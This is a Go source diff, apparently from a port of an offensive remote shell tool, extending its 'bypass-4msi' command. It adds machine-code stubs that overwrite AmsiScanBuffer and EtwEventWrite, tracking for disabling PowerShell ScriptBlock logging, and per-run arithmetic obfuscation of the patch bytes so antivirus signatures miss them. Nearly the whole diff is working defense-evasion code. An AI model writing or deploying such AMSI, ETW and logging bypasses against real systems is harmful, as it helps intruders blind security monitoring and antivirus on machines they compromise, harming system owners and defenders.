@@ -58,6 +58,11 @@ const bypassStepPause = 2 * time.Second
 // command ever contains the whole patch.
 const jumpMarker = "#jump"
 
+// sblMarker is output by the SBL step when the _enableScriptBlockLogging
+// field actually exists and was set. Modern Win11 builds removed the field,
+// so the step is a silent no-op there and the marker is absent.
+const sblMarker = "__sbl"
+
 // bypass4MSI implements `bypass-4msi`. It is the most detection-prone thing this
 // port does, and it is deliberately the last feature added: everything else here
 // works without it.
@@ -77,6 +82,7 @@ func (sh *Shell) bypass4MSI(ctx context.Context, sigs <-chan os.Signal) error {
 			sh.c.Blue("Info:"), len(steps), (time.Duration(len(steps)-1) * bypassStepPause).Round(time.Second))
 	}
 
+	var sblPatched bool
 	for i, step := range steps {
 		if strings.TrimSpace(step) == "" {
 			continue
@@ -92,10 +98,14 @@ func (sh *Shell) bypass4MSI(ctx context.Context, sigs <-chan os.Signal) error {
 			return fmt.Errorf("step %d/%d: %s", i+1, len(steps),
 				sanitizeTerminal(output.Text(res.Errors[0])))
 		}
-		// Any output at all is a problem: every step of a working patch is
-		// silent. This mirrors upstream, which treats output as the error report.
+		// Every step of a working patch is silent, except the SBL step which
+		// emits sblMarker when the field actually existed and was set.
 		for _, v := range res.Output {
 			if s := strings.TrimSpace(output.Text(v)); s != "" {
+				if s == sblMarker {
+					sblPatched = true
+					continue
+				}
 				return fmt.Errorf("step %d/%d: %s", i+1, len(steps), sanitizeTerminal(s))
 			}
 		}
@@ -116,12 +126,36 @@ func (sh *Shell) bypass4MSI(ctx context.Context, sigs <-chan os.Signal) error {
 	}
 
 	sh.amsiPatched = true
-	sh.log.Event("[bypass-4msi] AmsiScanBuffer + EtwEventWrite patched, ScriptBlock logging disabled")
-	if !sh.json && !sh.quiet {
-		fmt.Fprintf(sh.out, "%s AMSI and ETW patched, ScriptBlock logging disabled\n", sh.c.Blue("Info:"))
+	if sblPatched {
+		sh.log.Event("[bypass-4msi] AmsiScanBuffer + EtwEventWrite patched, ScriptBlock logging disabled")
+		if !sh.json && !sh.quiet {
+			fmt.Fprintf(sh.out, "%s AMSI and ETW patched, ScriptBlock logging disabled\n", sh.c.Blue("Info:"))
+		}
+	} else {
+		sh.log.Event("[bypass-4msi] AmsiScanBuffer + EtwEventWrite patched")
+		if !sh.json && !sh.quiet {
+			fmt.Fprintf(sh.out, "%s AMSI and ETW patched\n", sh.c.Blue("Info:"))
+		}
 	}
 	return nil
 }
+
+// amsiPatchBytes is the stub written over AmsiScanBuffer's prologue:
+//
+//	mov eax, 0x80071234
+//	mov ax, 0x0032
+//	mov al, 0x57
+//	ret
+//
+// The result is EAX = 0x80070057 (E_INVALIDARG), which makes the caller treat
+// the scan as failed and pass the content through.
+var amsiPatchBytes = []byte{0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3}
+
+// etwPatchBytes is the stub written over EtwEventWrite's prologue:
+//
+//	xor eax, eax
+//	ret
+var etwPatchBytes = []byte{0x31, 0xc0, 0xc3}
 
 // obfuscateBypass fills in the template the way upstream does, and the
 // randomisation is functional rather than cosmetic: AMSI scans the script that
@@ -130,8 +164,8 @@ func (sh *Shell) bypass4MSI(ctx context.Context, sigs <-chan os.Signal) error {
 // arithmetic is what gets the patch past the thing it is patching, and randomising
 // per invocation is what stops a signature matching the payload itself.
 //
-// Four transformations, in upstream's order: function names, variable names, the
-// marked string literals, then keyword casing.
+// Five transformations: function names, variable names, the marked string
+// literals, the patch byte arrays, then keyword casing.
 func obfuscateBypass(tmpl string, funcs, vars int, r *rand.Rand) string {
 	for i := 1; i <= funcs; i++ {
 		tmpl = strings.ReplaceAll(tmpl, fmt.Sprintf(">><FUNCTION%d>><", i), "Get-"+randomIdent(r, 7, 17))
@@ -140,6 +174,8 @@ func obfuscateBypass(tmpl string, funcs, vars int, r *rand.Rand) string {
 		tmpl = strings.ReplaceAll(tmpl, fmt.Sprintf(">><VAR%d>><", i), "$"+randomIdent(r, 7, 17))
 	}
 	tmpl = replaceMarkedStrings(tmpl, r)
+	tmpl = strings.ReplaceAll(tmpl, ">><AMSI_STUB>><", obfuscateByteArray(amsiPatchBytes, r))
+	tmpl = strings.ReplaceAll(tmpl, ">><ETW_STUB>><", obfuscateByteArray(etwPatchBytes, r))
 	return randomiseKeywordCase(tmpl, r)
 }
 
@@ -183,6 +219,39 @@ func charExpression(s string, r *rand.Rand) string {
 		parts = append(parts, strings.Join(chars, "+"))
 	}
 	return strings.Join(parts, `+"|"+`)
+}
+
+// obfuscateByteArray renders a byte slice as a PowerShell [Byte[]] expression
+// whose individual element values are computed from random arithmetic, so the
+// actual bytes never appear as literals in the script. This is the byte-array
+// counterpart of charExpression and exists for the same reason: AMSI signatures
+// target the well-known patch stubs.
+func obfuscateByteArray(data []byte, r *rand.Rand) string {
+	exprs := make([]string, len(data))
+	for i, b := range data {
+		exprs[i] = oneByteExpression(b, r)
+	}
+	return "[Byte[]](" + strings.Join(exprs, ",") + ")"
+}
+
+// oneByteExpression encodes a single byte value as an arithmetic expression
+// that evaluates to the original value. Three forms are used: subtraction,
+// XOR, and addition.
+func oneByteExpression(b byte, r *rand.Rand) string {
+	v := int(b)
+	k := 1 + r.Intn(254) // 1..254: neither operand is the target value
+	switch r.Intn(3) {
+	case 0:
+		return fmt.Sprintf("(%d-%d)", v+k, k)
+	case 1:
+		return fmt.Sprintf("(%d -bxor %d)", v^k, k)
+	default:
+		if v < 2 {
+			return fmt.Sprintf("(%d-%d)", v+k, k)
+		}
+		a := 1 + r.Intn(v-1)
+		return fmt.Sprintf("(%d+%d)", a, v-a)
+	}
 }
 
 // oneCharExpression encodes a single byte as a subtraction, so the character
